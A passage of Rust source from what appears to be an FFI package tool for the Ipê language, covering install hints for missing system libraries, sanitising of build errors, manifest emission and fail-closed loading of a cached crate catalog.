            // No crate name in this form; the caller fills it from context.
            return missing_system_lib(sys_lib, None);
        }
    }
    None
}

/// A curated map from well-known `pkg-config` library names to the
/// distribution package that provides their development files.
///
/// Single source of truth: the CLI install-hint message is derived entirely
/// from this table, so adding a row here extends coverage everywhere.
/// Format: `(pkg_config_name, debian_pkg, fedora_pkg, brew_formula)`.
/// An empty string means "same as the pkg-config name" (use the generic
/// `-dev` / `-devel` / direct formula name fallback).
const PKG_CONFIG_INSTALL_HINTS: &[(&str, &str, &str, &str)] = &[
    // Wayland
    (
        "wayland-client",
        "libwayland-dev",
        "wayland-devel",
        "wayland",
    ),
    (
        "wayland-server",
        "libwayland-dev",
        "wayland-devel",
        "wayland",
    ),
    (
        "wayland-cursor",
        "libwayland-dev",
        "wayland-devel",
        "wayland",
    ),
    ("wayland-egl", "libwayland-dev", "wayland-devel", "wayland"),
    // OpenSSL / TLS
    ("openssl", "libssl-dev", "openssl-devel", "openssl"),
    ("libssl", "libssl-dev", "openssl-devel", "openssl"),
    // D-Bus
    ("dbus-1", "libdbus-1-dev", "dbus-devel", "dbus"),
    // SQLite
    ("sqlite3", "libsqlite3-dev", "sqlite-devel", "sqlite"),
    // zlib
    ("zlib", "zlib1g-dev", "zlib-devel", "zlib"),
    // libpng
    ("libpng", "libpng-dev", "libpng-devel", "libpng"),
    // libjpeg
    ("libjpeg", "libjpeg-dev", "libjpeg-devel", "jpeg"),
    // freetype
    ("freetype2", "libfreetype-dev", "freetype-devel", "freetype"),
    // fontconfig
    (
        "fontconfig",
        "libfontconfig-dev",
        "fontconfig-devel",
        "fontconfig",
    ),
    // X11 / XCB
    ("x11", "libx11-dev", "libX11-devel", "libx11"),
    ("xcb", "libxcb-dev", "libxcb-devel", "libxcb"),
    (
        "xkbcommon",
        "libxkbcommon-dev",
        "libxkbcommon-devel",
        "libxkbcommon",
    ),
    // GTK
    ("gtk+-3.0", "libgtk-3-dev", "gtk3-devel", "gtk+3"),
    ("gtk4", "libgtk-4-dev", "gtk4-devel", "gtk4"),
    // GLib / GObject
    ("glib-2.0", "libglib2.0-dev", "glib2-devel", "glib"),
    // Vulkan
    (
        "vulkan",
        "libvulkan-dev",
        "vulkan-headers",
        "vulkan-headers",
    ),
    // libcurl
    ("libcurl", "libcurl4-openssl-dev", "libcurl-devel", "curl"),
    // libudev
    ("libudev", "libudev-dev", "systemd-devel", ""),
    // alsa
    ("alsa", "libasound2-dev", "alsa-lib-devel", ""),
    // pipewire
    (
        "libpipewire-0.3",
        "libpipewire-0.3-dev",
        "pipewire-devel",
        "pipewire",
    ),
];

/// Build a human-readable install hint for a `pkg-config` library name.
///
/// Looks up `sys_lib` in the curated table first; falls back to a generic
/// "install the `-dev` package that provides `<lib>.pc`" message when the
/// library is not in the table. Only a parsed [`SysLibName`] reaches the
/// suggested command.
#[must_use]
pub fn install_hint_for(sys_lib: &SysLibName) -> String {
    let sys_lib = sys_lib.as_str();
    for &(key, deb, fed, brew) in PKG_CONFIG_INSTALL_HINTS {
        if key == sys_lib {
            let mut parts: Vec<String> = Vec::new();
            if !deb.is_empty() {
                parts.push(format!("Debian/Ubuntu: `apt install {deb}`"));
            }
            if !fed.is_empty() {
                parts.push(format!("Fedora/RHEL: `dnf install {fed}`"));
            }
            if !brew.is_empty() {
                parts.push(format!("macOS: `brew install {brew}`"));
            }
            if parts.is_empty() {
                break;
            }
            return parts.join("; ");
        }
    }
    format!(
        "install the `-dev` / `-devel` package that provides `{sys_lib}.pc` \
         (e.g. Debian/Ubuntu: `apt install lib{sys_lib}-dev`)"
    )
}

/// Strip ANSI escape sequences, control characters, and hiding or reordering
/// format characters from a foreign string (rustc/build-script stderr) before
/// interpolating it into a diagnostic, keeping it on one line.
///
/// A length-capped but un-stripped foreign string can carry terminal control
/// codes that forge markup or corrupt a structured output consumer. The value
/// is shown inline, so it is parsed into one [`TerminalLine`].
fn strip_foreign_str(s: &str) -> String {
    TerminalLine::sanitize(s).as_str().to_owned()
}

/// Summarise the raw inspector error strings into a short human-readable
/// message for the `--verbose`-less case.
///
/// Keeps at most a few lines of context from the raw log. The full log is
/// available under `--verbose` (the CLI layer adds that escape hatch around
/// the call site).
#[must_use]
pub fn summarise_inspector_errors(errors: &[String]) -> String {
    // Look for the first `error[` or `error:` line from rustc/cargo — that is
    // the root-cause line, not the noise of `cargo:rerun-if-env-changed=…`.
    let root = errors
        .iter()
        .find(|l| {
            let t = l.trim_start();
            t.starts_with("error[") || t.starts_with("error:") || t.starts_with("panicked at")
        })
        .map(String::as_str);

    root.map_or_else(
        || {
            // No recognised root-cause line: show the last non-empty error string as
            // a last resort rather than nothing.
            let raw = errors
                .iter()
                .rev()
                .find(|l| !l.trim().is_empty())
                .map_or("the inspector did not emit a diagnostic", String::as_str)
                .trim();
            strip_foreign_str(raw)
        },
        |line| {
            let line = strip_foreign_str(line.trim());
            let line = line.trim();
            // Truncate very long lines so the diagnostic stays readable. Count and
            // slice by characters, never by byte index — cargo/build-script stderr
            // carries non-ASCII (unicode identifiers, non-ASCII paths), and a byte
            // slice that lands inside a multibyte char panics.
            if line.chars().count() > 200 {
                let head: String = line.chars().take(200).collect();
                format!("{head}…")
            } else {
                line.to_owned()
            }
        },
    )
}

/// Decode one inspection document and write its artifacts — the shared
/// tail of `ipe add` and `ipe install`.
///
/// A package whose inspector error channel is non-empty is refused: an
/// unusable inspection must never seed a cache. The error is parsed at the
/// boundary: a pkg-config missing-library signature becomes a typed
/// [`Diagnostic::SystemLibraryNotFound`] carrying an actionable install hint;
/// all other failures become a summarised [`Diagnostic::WireMalformed`].
///
/// # Errors
///
/// The decode diagnostic, the inspector's fail-closed refusal, or an
/// `IPE-F4412` write failure.
pub fn install_from_inspection(
    cache: &FfiCache,
    inspection_json: &str,
) -> Result<(PkgInfo, ArtifactPaths), Diagnostic> {
    let pkg = PkgInfo::decode_json(inspection_json)?;
    if !pkg.errors().is_empty() {
        // Parse the error channel at the boundary — the typed value is what the
        // caller and the CLI act on, not the raw string.
        if let Some(missing) = detect_missing_system_lib(pkg.errors()) {
            let install_hint = install_hint_for(&missing.system_lib);
            let crate_name = missing
                .crate_name
                .map_or_else(|| pkg.name().to_owned(), |name| name.as_str().to_owned());
            return Err(Diagnostic::SystemLibraryNotFound {
                system_lib: missing.system_lib,
                crate_name,
                install_hint,
            });
        }
        let summary = summarise_inspector_errors(pkg.errors());
        return Err(Diagnostic::WireMalformed {
            context: format!("crate `{}`", pkg.name()),
            defect: crate::diag::WireDefect::Json {
                detail: format!("the inspector failed: {summary}"),
            },
        });
    }
    let paths = cache.write_package(&pkg, inspection_json)?;
    Ok((pkg, paths))
}

// ── consumer manifest + installed-crate catalog ─────────────────────────────

/// Serialize the consumer manifest for one validated package: everything the
/// build-time catalog loader needs WITHOUT re-running inspection.
///
/// # Errors
///
/// Propagates the pinned-dep-line derivation failure (an unpinned dependency
/// is refused at install, never discovered at build).
pub fn emit_consumer_json(
    pkg: &PkgInfo,
    iface: &crate::interface::CrateInterface,
    cache: &FfiCache,
) -> Result<String, Diagnostic> {
    let bindings: Vec<serde_json::Value> = iface
        .bindings
        .iter()
        .map(|b| {
            let mut o = serde_json::Map::new();
            o.insert("refName".into(), b.ref_name.clone().into());
            o.insert("wrapperIdent".into(), b.wrapper_ident.clone().into());
            o.insert("arity".into(), b.arity.into());
            o.insert("sig".into(), b.sig.clone().into());
            if !b.transparent_params.is_none() {
                o.insert(
                    "transparentParams".into(),
                    serde_json::json!(b.transparent_params.slots()),
                );
            }
            if let Some(r) = &b.transparent_result {
                o.insert(
                    "transparentResult".into(),
                    serde_json::json!({ "typeName": r.type_name, "inResult": r.in_result }),
                );
            }
            serde_json::Value::Object(o)
        })
        .collect();
    let transparent: Vec<serde_json::Value> = iface
        .transparent_types
        .values()
        .map(crate::emit::transparent_type_json)
        .collect();
    let mut doc = serde_json::json!({
        "moduleName": iface.module_name,
        "kernelName": iface.kernel_name,
        "opaqueTypes": iface.opaque_types,
        "opaqueTypeIds": iface.opaque_type_ids,
        "defineTypes": iface.define_types,
        "cargoDeps": cargo_dep_lines(pkg, cache)?,
        "bindings": bindings,
    });
    if !transparent.is_empty()
        && let Some(map) = doc.as_object_mut()
    {
        map.insert("transparentTypes".into(), serde_json::json!(transparent));
    }
    let mut text = serde_json::to_string_pretty(&doc).unwrap_or_else(|_| "{}".to_owned());
    text.push('\n');
    Ok(text)
}

/// One installed crate's consumer-side view, loaded from the artifact cache.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InstalledCrate {
    /// The cache slug (`semver`).
    pub slug: String,
    /// Ipê module qualifier (`Rust.Semver`).
    pub module_name: String,
    /// Kernel-name prefix (`Rust_Semver`).
    pub kernel_name: String,
    /// The injectable Ipê interface module source.
    pub interface_source: String,
    /// The full `_bindings.rs` wrapper source.
    pub bindings_source: String,
    /// Opaque foreign type name → absolute Rust path.
    pub opaque_types: std::collections::BTreeMap<String, String>,
    /// Opaque foreign type name → canonical defining-path identity (see
    /// [`crate::interface::CrateInterface::opaque_type_ids`]). Empty for a
    /// cache written before identities existed — such a crate never unifies.
    pub opaque_type_ids: std::collections::BTreeMap<String, String>,
    /// The nominal names this crate's `[rust.define.struct/enum]` decls DEFINE
    /// (see [`crate::interface::CrateInterface::define_types`]). These live at
    /// `crate::ffi::<slug>::<Name>` in the emitted app crate, so `assemble_emit`
    /// renders their `foreign_types` path crate-locally rather than as an
    /// external `::crate::Path`.
    pub define_types: BTreeSet<String>,
    /// The transparent foreign types the interface surfaces (see
    /// [`crate::interface::CrateInterface::transparent_types`]) — the shapes
    /// the backend's conversion glue is assembled from. Empty for a legacy
    /// cache, whose interface text predates transparency.
    pub transparent_types: std::collections::BTreeMap<String, crate::transparency::TransparentType>,
    /// The typed `[dependencies]` entries the emitted app crate needs.
    pub cargo_deps: Vec<CargoDep>,
    /// The crate's own Cargo package name, the `[dependencies]` key its direct
    /// pin renders under.
    ///
    /// `None` for a legacy cache, which predates the inspection document and
    /// so cannot prove which of its dependency lines is the direct crate.
    pub package_name: Option<PackageName>,
    /// Cargo package name → Rust lib identifier, for every dependency the
    /// crate's inspection resolved.
    ///
    /// The bridge between the two tables `assemble_emit` must keep in
    /// agreement: the `[dependencies]` key a pin renders under and the
    /// `::<ident>::` path root emitted code names. Empty for a legacy cache.
    pub dep_idents: std::collections::BTreeMap<String, crate::naming::RustIdent>,
    /// The structured interface bindings (name, wrapper, arity, signature) —
    /// the data the catalog unification re-renders a demoted module from.
    pub bindings: Vec<crate::interface::InterfaceBinding>,
    /// Every wrapper fn identifier the interface forwards to.
    pub wrapper_idents: BTreeSet<String>,
    /// Rust lib ident → exact resolved version, from the crate's own
    /// inspection (its jail's lockfile). The unification's version guard
    /// refuses to collapse two nominals whose defining crate resolved to
    /// different versions across members. Empty for a legacy cache.
    pub dep_versions: std::collections::BTreeMap<String, String>,
    /// Inspected crate-top-level free-function facts, keyed by fn name — the
    /// asserted-call compile-time cross-check (`Rust.Ffi.call`, design §5.2
    /// rule 1). Empty for a legacy cache, which then cross-checks nothing;
    /// the emitted shim's `rustc` check still holds.
    pub inspected_free_fns: std::collections::BTreeMap<String, InspectedFnFact>,
    /// Inspected public-constant facts, keyed by the constant's crate-relative
    /// path (`f64::consts::PI`) — the `Rust.const` type cross-check. A native
    /// constant must appear here or its assertion is refused (fail-closed, no
    /// blind trust). Empty for a legacy cache, which then admits no `.const`.
    pub inspected_consts: std::collections::BTreeMap<String, InspectedConstFact>,
}

/// One inspected free function's declared Rust surface, for the asserted-call
/// exact-carrier cross-check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InspectedFnFact {
    /// Parameter Rust types, verbatim from the inspection.
    pub params: Vec<String>,
    /// The result Rust type, or `None` for a unit return.
    pub result: Option<String>,
    /// The inspector's effect classification.
    pub effect: crate::pkginfo::Effect,
}

/// One inspected public constant's declared Rust surface, for the `Rust.const`
/// exact-carrier type cross-check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InspectedConstFact {
    /// The constant's Rust type, verbatim from the inspection (`f64`, `&str`).
    pub ty: String,
}

/// Load the catalog of a cache the caller created itself, reading by path.
///
/// An absent cache directory is an empty catalog. This reader follows links
/// and caps nothing, so it exists only for tests: production loads a
/// discovered cache through [`load_catalog_from`] over an owner-checked,
/// no-follow handle.
///
/// # Errors
///
/// As [`load_catalog_from`].
#[cfg(any(test, feature = "testing"))]
pub fn load_catalog(cache_root: &Path) -> Result<Vec<InstalledCrate>, Diagnostic> {
    if !cache_root.is_dir() {
        return Ok(Vec::new());
    }
    load_catalog_from(&PathCacheSource(cache_root))
}

/// A readable FFI cache directory the catalog loader draws its artifacts from.
///
/// The loader never touches the filesystem itself: every listing and read goes
/// through the source, so a caller holding the cache as an owner-checked,
/// no-follow directory handle keeps every read on that same handle.
pub trait CacheSource {
    /// The error a listing or read fails with; every loader diagnostic converts into it.
    type Error: From<Diagnostic>;

    /// The cache directory's path, used only to name artifacts in diagnostics.
    fn root(&self) -> &Path;

    /// The names of the entries directly inside the cache directory.
    ///
    /// # Errors
    ///
    /// When the directory cannot be listed.
    fn entry_names(&self) -> Result<Vec<String>, Self::Error>;

    /// The text of the artifact `name`, or `None` when no such entry exists.
    ///
    /// # Errors
    ///
    /// When the entry exists but cannot be read as a trusted artifact.
    fn read_artifact(&self, name: &str) -> Result<Option<String>, Self::Error>;
}

/// A cache read by path, following links, for a directory the caller owns outright.
#[cfg(any(test, feature = "testing"))]
struct PathCacheSource<'a>(&'a Path);

#[cfg(any(test, feature = "testing"))]
impl CacheSource for PathCacheSource<'_> {
    type Error = Diagnostic;

    fn root(&self) -> &Path {
        self.0
    }

    fn entry_names(&self) -> Result<Vec<String>, Diagnostic> {
        let io_err = |e: &std::io::Error| Diagnostic::ArtifactIo {
            path: self.0.to_string_lossy().into_owned(),
            detail: e.to_string(),
        };
        let mut names = Vec::new();
        for entry in std::fs::read_dir(self.0).map_err(|e| io_err(&e))? {
            let entry = entry.map_err(|e| io_err(&e))?;
            names.push(entry.file_name().to_string_lossy().into_owned());
        }
        Ok(names)
    }

    fn read_artifact(&self, name: &str) -> Result<Option<String>, Diagnostic> {
        let path = self.0.join(name);
        if !path.is_file() {
            return Ok(None);
        }
        std::fs::read_to_string(&path)
            .map(Some)
            .map_err(|e| Diagnostic::ArtifactIo {
                path: path.to_string_lossy().into_owned(),
                detail: e.to_string(),
            })
    }
}

/// Load every installed crate from a project's FFI artifact cache, read through `source`.
///
/// `<slug>.pkg.json` is the SOLE source of record: when it exists, EVERY
/// consumer-side view — interface source, bindings source, module/kernel
/// names, opaque maps, dep lines — is RE-DERIVED by decoding it through the
/// validated [`PkgInfo`] gate and re-running the emitters. The sibling
/// projection files (`.ipei`, `consumer.json`, `<slug>.ipe`, `_bindings.rs`)
/// are debug/watch artifacts the loader never trusts, so a projection that
/// diverges from the catalog (torn write, mixed-run cache, hand edit) is
/// inert by construction: a member either exists in `pkg.json` or it does
/// not exist anywhere. A planted `_bindings.rs` cannot inject a wrapper
/// body, because the emit derives only from decode-validated newtypes (no
/// raw type/path/selector string reaches the rendered code); a tampered
/// `pkg.json` re-runs the full decode gate, so it can only ever produce
/// injection-free wrappers or fail closed.
///
/// # Errors
///
/// `IPE-F4412` for an unreadable artifact; a wire-defect diagnostic for a
/// malformed consumer manifest, a malformed inspection document, or a missing
/// wrapper; any error `source` raises while listing or reading.
pub fn load_catalog_from<S: CacheSource>(source: &S) -> Result<Vec<InstalledCrate>, S::Error> {
    let mut slugs: Vec<String> = source
        .entry_names()?
        .into_iter()
        .filter_map(|name| name.strip_suffix(CONSUMER_SUFFIX).map(str::to_owned))
        .collect();
    slugs.sort();
    let mut out = Vec::with_capacity(slugs.len());
    for slug in slugs {
        out.push(load_installed_crate(source, slug)?);
    }
    Ok(out)
}

/// Load and validate ONE installed crate's artifacts (see [`load_catalog_from`]).
///
/// # Errors
///
/// As [`load_catalog_from`], scoped to this slug's artifacts.
#[allow(clippy::too_many_lines)] // one linear artifact decode-and-cross-check cascade
fn load_installed_crate<S: CacheSource>(
    source: &S,
    slug: String,
) -> Result<InstalledCrate, S::Error> {
    {
        let cache = FfiCache {
            root: source.root().to_path_buf(),
        };
        let paths = cache.artifact_paths(&slug);
        let names = ArtifactNames::for_slug(&slug);
        let read = |name: &str, path: &Path| -> Result<String, S::Error> {
            source.read_artifact(name)?.ok_or_else(|| {
                Diagnostic::ArtifactIo {
                    path: path.to_string_lossy().into_owned(),
                    detail: "artifact is missing".to_owned(),
                }
                .into()
            })
        };
        // RE-DERIVE the whole consumer-side view from the validated
        // inspection document — no on-disk projection is trusted as text
        // (see [`load_catalog_from`]). A legacy cache written before the
        // `pkg.json` artifact existed has no document to re-derive from; it
        // falls back to the stored projections, whose trust then rests on
        // the discovery-time ownership/write-boundary gate the source
        // enforces plus the injection-free-by-construction emitter.
        if let Some(pkg_text) = source.read_artifact(&names.pkg_json)? {
            let pkg = PkgInfo::decode_json(&pkg_text)?;
            return installed_crate_from_pkg(slug, &pkg, &cache).map_err(Into::into);
        }
        let consumer_text = read(&names.consumer, &paths.consumer)?;
        let interface_source = read(&names.interface, &paths.interface)?;
        let dep_versions: std::collections::BTreeMap<String, String> =
            std::collections::BTreeMap::new();
        let bindings_source = read(&names.bindings, &paths.bindings)?;
        let malformed = |detail: String| Diagnostic::WireMalformed {
            context: format!("consumer manifest `{}`", paths.consumer.display()),
            defect: crate::diag::WireDefect::Json { detail },
        };
        let doc: serde_json::Value = serde_json::from_str(&consumer_text)
            .map_err(|e| malformed(format!("invalid JSON: {e}")))?;
        let str_field = |key: &str| -> Result<String, Diagnostic> {
            doc.get(key)
                .and_then(serde_json::Value::as_str)
                .map(str::to_owned)
                .ok_or_else(|| malformed(format!("missing string field `{key}`")))
        };
        let module_name = str_field("moduleName")?;
        let kernel_name = str_field("kernelName")?;
        // Opaque-type paths reach the wrapper emitter verbatim; parse each
        // through the validated newtype at the cache boundary so an un-renderable
        // path is unrepresentable past decode.
        let opaque_types: std::collections::BTreeMap<String, String> = {
            let raw = doc
                .get("opaqueTypes")
                .and_then(serde_json::Value::as_object);
            let mut out = std::collections::BTreeMap::new();
            for (k, v) in raw.into_iter().flatten() {
                let s = v
                    .as_str()
                    .ok_or_else(|| malformed(format!("opaqueTypes[{k:?}]: not a string")))?;
                crate::naming::RustPathSegment::parse(s).map_err(|e| {
                    malformed(format!("opaqueTypes[{k:?}]: invalid Rust path: {e:?}"))
                })?;
                out.insert(k.clone(), s.to_owned());
            }
            out
        };
        // Mirror the fail-closed decode of `opaqueTypes`: a non-string value is a
        // malformed manifest (silent coercion could hide a tampered cache entry).
        // An absent `opaqueTypeIds` field is allowed (older caches omit it).
        let opaque_type_ids: std::collections::BTreeMap<String, String> = {
            let raw = doc
                .get("opaqueTypeIds")
                .and_then(serde_json::Value::as_object);
            let mut out = std::collections::BTreeMap::new();
            for (k, v) in raw.into_iter().flatten() {
                let s = v
                    .as_str()
                    .ok_or_else(|| malformed(format!("opaqueTypeIds[{k:?}]: not a string")))?;
                out.insert(k.clone(), s.to_owned());
            }
            out
        };
        let define_types: BTreeSet<String> = doc
            .get("defineTypes")
            .and_then(serde_json::Value::as_array)
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().map(str::to_owned))
                    .collect()
            })
            .unwrap_or_default();
        // Each stored line is parsed back into a typed registry pin under the
        // exact grammar the manifest emitter renders. A legacy manifest has no
        // inspection document to re-derive a wrapper crate's source from, so a
        // `path` line (and every other shape) is refused rather than forwarded
        // into the emitted `Cargo.toml` unproven.
        let cargo_deps: Vec<CargoDep> = match doc.get("cargoDeps") {
            None => Vec::new(),
            Some(v) => v
                .as_array()
                .ok_or_else(|| malformed("`cargoDeps` is not an array".to_owned()))?
                .iter()
                .map(|line| {
                    let line = line.as_str().ok_or_else(|| {
                        malformed("`cargoDeps` carries a non-string entry".to_owned())
                    })?;
                    CargoDep::parse_registry_line(line).map_err(|defect| {
                        Diagnostic::WireMalformed {
                            context: format!("consumer manifest `{}`", paths.consumer.display()),
                            defect,
                        }
                    })
                })
                .collect::<Result<_, _>>()?,
        };
        let transparent_types: std::collections::BTreeMap<
            String,
            crate::transparency::TransparentType,
        > = match doc.get("transparentTypes") {
            None => std::collections::BTreeMap::new(),
            Some(v) => {
                let entries = v
                    .as_array()
                    .ok_or_else(|| malformed("`transparentTypes` is not an array".to_owned()))?;
                let mut out = std::collections::BTreeMap::new();
                for entry in entries {
                    let t = crate::transparency::TransparentType::from_projection_json(entry)
                        .map_err(malformed)?;
                    out.insert(t.name().as_str().to_owned(), t);
                }
                out
            }
        };
        // Fail-closed cross-check: an interface text that surfaces a
        // transparent shape — a record alias (`type alias …`) or a closed
        // union (exported WITH `(..)`, a marker the opaque `type N = N`
        // placeholder and every `define` nominal never carry) — must come
        // with the structured shapes, or the glue the backend assembles from
        // them would be missing while the module still declares the
        // record/union as a native app type. The lowerer keys transparency on
        // this module TEXT, so it would emit an app enum the wrapper's foreign
        // result never converts to (an E0308 the SEAL forbids). A torn or
        // hand-edited projection pair, refused rather than mis-wired.
        let surfaces_transparent =
            interface_source.contains("\ntype alias ") || interface_source.contains("(..)");
        if transparent_types.is_empty() && surfaces_transparent {
            return Err(malformed(
                "interface module surfaces a transparent record/union but the manifest \
                 carries no `transparentTypes` — re-run `ipe add` to regenerate the cache"
                    .to_owned(),
            )
            .into());
        }
        let bindings: Vec<crate::interface::InterfaceBinding> = doc
            .get("bindings")
            .and_then(serde_json::Value::as_array)
            .map_or_else(
                || Ok(Vec::new()),
                |a| {
                    a.iter()
                        .filter_map(|b| {
                            let get = |k: &str| b.get(k).and_then(serde_json::Value::as_str);
                            let ref_name = get("refName")?.to_owned();
                            let wrapper_ident = get("wrapperIdent")?.to_owned();
                            let arity = usize::try_from(
                                b.get("arity").and_then(serde_json::Value::as_u64)?,
                            )
                            .ok()?;
                            let sig = get("sig")?.to_owned();
                            // Absent slots mean no parameter converts; present
                            // slots must align with the binding's arity, or the
                            // backend would skip (or misapply) a conversion.
                            // A slot is a transparent type name or `null`; any
                            // other JSON value is malformed, never read as "no
                            // conversion".
                            let transparent_params = b
                                .get("transparentParams")
                                .and_then(serde_json::Value::as_array)
                                .map_or_else(
                                    || Ok(crate::interface::TransparentParams::None),
                                    |ps| {
                                        ps.iter()
                                            .enumerate()
                                            .map(|(i, p)| match p {
                                                serde_json::Value::Null => Ok(None),
                                                serde_json::Value::String(s) => Ok(Some(s.clone())),
                                                serde_json::Value::Bool(_)
                                                | serde_json::Value::Number(_)
                                                | serde_json::Value::Array(_)
                                                | serde_json::Value::Object(_) => {
                                                    Err(malformed(format!(
                                                        "binding `{ref_name}`: \
                                                         transparentParams[{i}] is neither a \
                                                         type name nor null"
                                                    )))
                                                }
                                            })
                                            .collect::<Result<Vec<_>, Diagnostic>>()
                                            .and_then(|slots| {
                                                crate::interface::TransparentParams::aligned(
                                                    slots, arity,
                                                )
                                                .map_err(|drift| {
                                                    malformed(format!(
                                                        "binding `{ref_name}`: {drift}"
                                                    ))
                                                })
                                            })
                                    },
                                );
                            let transparent_result = b.get("transparentResult").and_then(|r| {
                                Some(crate::interface::TransparentResult {
                                    type_name: r
                                        .get("typeName")
                                        .and_then(serde_json::Value::as_str)?
                                        .to_owned(),
                                    in_result: r
                                        .get("inResult")
                                        .and_then(serde_json::Value::as_bool)?,
                                })
                            });
                            Some(transparent_params.map(|transparent_params| {
                                crate::interface::InterfaceBinding {
                                    ref_name,
                                    wrapper_ident,
                                    arity,
                                    sig,
                                    transparent_params,
                                    transparent_result,
                                }
                            }))
                        })
                        .collect::<Result<Vec<_>, Diagnostic>>()
                },
            )?;
        let wrapper_idents: BTreeSet<String> =
            bindings.iter().map(|b| b.wrapper_ident.clone()).collect();
        // Fail-closed cross-check: every forwarded wrapper must exist in the
        // stored bindings source.
        for ident in &wrapper_idents {
            let decl = format!("pub fn {ident}(");
            if !bindings_source.contains(&decl) {
                return Err(malformed(format!(
                    "interface forwards to wrapper `{ident}` but `{}` declares no such \
                     `pub fn` — re-run `ipe add` to regenerate the cache",
                    paths.bindings.display()
                ))
                .into());
            }
        }
        Ok(InstalledCrate {
            slug,
            module_name,
            kernel_name,
            interface_source,
            bindings_source,
            opaque_types,
            opaque_type_ids,
            define_types,
            transparent_types,
            cargo_deps,
            package_name: None,
            dep_idents: std::collections::BTreeMap::new(),
            bindings,
            wrapper_idents,
            dep_versions,
            inspected_free_fns: std::collections::BTreeMap::new(),
            inspected_consts: std::collections::BTreeMap::new(),
        })
    }
}

/// Re-derive one installed crate's whole consumer-side view from its
/// validated inspection document — the single constructor both the catalog
/// loader and the asserted-call tests build from.
///
/// # Errors
/// A wire-defect diagnostic when a dependency line cannot be rendered.
pub fn installed_crate_from_pkg(
    slug: String,
    pkg: &PkgInfo,
    cache: &FfiCache,
) -> Result<InstalledCrate, Diagnostic> {
    let mut dep_versions: std::collections::BTreeMap<String, String> =
        std::collections::BTreeMap::new();
    let mut dep_idents: std::collections::BTreeMap<String, crate::naming::RustIdent> =
        std::collections::BTreeMap::new();
    for dep in pkg.transitive_deps() {
        dep_versions.insert(
            dep.ident.as_str().to_owned(),
            dep.version.as_str().to_owned(),
        );
        dep_idents.insert(dep.name.as_str().to_owned(), dep.ident.clone());
    }
    // The asserted-call cross-check facts: crate-top-level FREE functions
    // only (no receiver, no accessor shape, no generics) — the one shape an
    // asserted path can name that inspection also records.
    let mut inspected_free_fns: std::collections::BTreeMap<String, InspectedFnFact> =
        std::collections::BTreeMap::new();
    for f in pkg.fns() {
        let is_free_fn = f.recv_type().is_empty()
            && f.method_name().is_empty()
            && f.generic().is_none()
            && matches!(f.shape(), crate::pkginfo::FnShape::Plain);
        if is_free_fn {
            inspected_free_fns.insert(
                f.name().to_owned(),
                InspectedFnFact {
                    params: f.params().iter().map(|p| p.foreign_ty.clone()).collect(),
                    result: f.results().first().map(|r| r.foreign_ty.clone()),
                    effect: f.effect(),
                },
            );
        }
    }
    // The `Rust.const` cross-check facts: every inspected public constant,
    // keyed by its crate-relative path, carrying its recorded Rust type.
    let mut inspected_consts: std::collections::BTreeMap<String, InspectedConstFact> =
        std::collections::BTreeMap::new();
    for c in pkg.consts() {
        inspected_consts.insert(
            c.path().to_owned(),
            InspectedConstFact {
                ty: c.rust_type().to_owned(),
            },
        );
    }
    let iface = crate::interface::crate_interface(pkg);
    let bindings_source = crate::bindings::emit_bindings(pkg);
    let wrapper_idents: BTreeSet<String> = iface
        .bindings
        .iter()
        .map(|b| b.wrapper_ident.clone())
        .collect();
    Ok(InstalledCrate {
        slug,
        module_name: iface.module_name,
        kernel_name: iface.kernel_name,
        interface_source: iface.source,
        bindings_source,
        opaque_types: iface.opaque_types,
        opaque_type_ids: iface.opaque_type_ids,
        define_types: iface.define_types,
        transparent_types: iface.transparent_types,
        cargo_deps: cargo_deps(pkg, cache)?,
        package_name: Some(pkg.name_pkg().clone()),
        dep_idents,
        bindings: iface.bindings,
        wrapper_idents,
        dep_versions,
        inspected_free_fns,
        inspected_consts,
    })
}

// ── coverage report (the over-drop keystone made visible) ───────────────────

/// The `coverage.md` artifact: what was bound, what was refused, and why —
/// including the per-binding interface skips (the over-drop keystone is only
/// visible if EVERY drop layer reports).
#[must_use]
pub fn emit_coverage(
    pkg: &PkgInfo,
    interface_skips: &[crate::interface::SkippedBinding],
) -> String {
    use std::fmt::Write;
    let mut out = format!(
        "# FFI coverage — `{}` {}\n\nBound functions: {}\n",
        pkg.name(),
        pkg.version(),
        pkg.fns().len()
    );
    if pkg.dropped().is_empty() {
        out.push_str("Dropped bindings: none\n");
    } else {
        // Writing into a String is infallible.
        let _ = writeln!(out, "Dropped bindings: {}\n", pkg.dropped().len());
        out.push_str("| Reason |\n|---|\n");
        for d in pkg.dropped() {
            let _ = writeln!(out, "| {d} |");
        }
    }
    if !interface_skips.is_empty() {
        let _ = writeln!(
            out,
            "\n## Interface skips ({} — wrapper exists or was refused; not importable)\n",
            interface_skips.len()
        );
        out.push_str("| Binding | Reason |\n|---|---|\n");
        for s in interface_skips {
            let _ = writeln!(out, "| {} | {} |", s.ref_name, s.reason);
        }
    }
    let types = pkg.foreign_types();
    if !types.transparent().is_empty() || !types.opaque_reasons().is_empty() {
        out.push_str("\n## Foreign types — the per-type representation decision\n\n");
        out.push_str("| Type | Representation | Why |\n|---|---|---|\n");
        for t in types.transparent().values() {
            let repr = match t {
                crate::transparency::TransparentType::Struct { .. } => "transparent record",
                crate::transparency::TransparentType::Enum { .. } => "transparent closed union",
            };
            let _ = writeln!(
                out,
                "| {} | {repr} | every member an identity carrier, member set a stable contract |",
                t.name()
            );
        }
        for r in types.opaque_reasons() {
            let _ = writeln!(out, "| {} | opaque handle | {} |", r.name, r.reason);
        }
    }
    if !pkg.notes().is_empty() {
        out.push_str("\n## Inspector notes\n\n");
        for note in pkg.notes() {
            let _ = writeln!(out, "- {note}");
        }
    }
    out
}

// ── dynamic manifest lines ──────────────────────────────────────────────────

/// One `[dependencies]` entry of the emitted app crate, typed.
///
/// Every bare value spliced into the rendered line is a decode-validated
/// newtype whose charset gate excludes TOML metacharacters: the key is a
/// [`PackageName`] (`[A-Za-z0-9_-]+`, alphabetic-first), the pin a
/// [`CrateVersion`], and each feature a [`FeatureName`]. The wrapper path is a
/// [`crate::pkginfo::JailedWrapperDir`] (proven inside the project root, its
/// `Cargo.toml` naming the key) and is the one free-text value: it is rendered
/// only through [`toml_basic_string`], which escapes every character a TOML
/// basic string cannot hold raw. No `"`-and-newline payload can close a string
/// and inject manifest content.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CargoDep {
    /// A registry crate pinned to one exact version.
    Registry {
        /// The dependency key.
        name: PackageName,
